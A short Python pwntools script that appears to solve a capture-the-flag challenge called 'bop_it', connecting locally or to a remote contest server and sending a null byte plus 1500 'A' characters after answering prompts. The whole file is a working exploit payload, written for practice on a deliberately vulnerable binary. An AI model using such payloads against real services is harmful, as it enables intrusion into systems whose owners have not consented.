from pwn import *
import tty
import sys

context.clear(arch='amd64', os='linux', log_level='debug')

argv = sys.argv
binary_path = './bop_it'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('shell.actf.co', 20702)
else:
	sh = process([binary_path])

e = ELF(binary_path)

if DEBUG:
	gdb.attach(sh, 'pie breakpoint main+525')

# --------------- plan ------------------
# null byte poisoning

flag = False
while not flag:
	message = sh.recvline()
	if 'Flag' in message:
		flag = True
	else:
		sh.sendline(message[0])


sh.sendline('\x00' + 'A' * 1500)

print sh.recvline()
